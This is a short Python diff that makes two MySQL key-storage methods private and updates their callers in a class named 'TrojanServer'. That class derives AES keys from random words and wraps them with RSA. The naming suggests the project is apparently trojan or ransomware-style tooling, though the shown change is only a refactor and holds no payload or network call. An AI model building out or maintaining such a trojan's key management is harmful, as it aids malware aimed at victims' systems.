@@ -81,7 +81,7 @@ class SQLDatabaseManager:
             "database": db_name
         }
 
-    def save_aes_key_in_database(self, key_b64):
+    def _save_aes_key_in_database(self, key_b64):
         conn = mysql.connector.connect(**self.config)
         cursor = conn.cursor()
         cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (key_b64,))
@@ -89,7 +89,7 @@ class SQLDatabaseManager:
         cursor.close()
         conn.close()
 
-    def get_last_aes_key_from_database(self):
+    def _get_last_aes_key_from_database(self):
         conn = mysql.connector.connect(**self.config)
         cursor = conn.cursor()
         cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")
@@ -160,11 +160,11 @@ class TrojanServer:
         word = self.keys.get_random_word()
         aes_key = self.keys.generate_aes_key_from_secret_word(word)
         encrypted = self.keys.encrypt_aes_key_with_rsa(aes_key)
-        self.db.save_aes_key_in_database(encrypted)
+        self.db._save_aes_key_in_database(encrypted)
         return aes_key
 
     def _retrieve_aes_key(self):
-        encrypted_key = self.db.get_last_aes_key_from_database()
+        encrypted_key = self.db._get_last_aes_key_from_database()
         aes_key = self.keys.decrypt_aes_key_with_rsa(encrypted_key)
         return aes_key
     
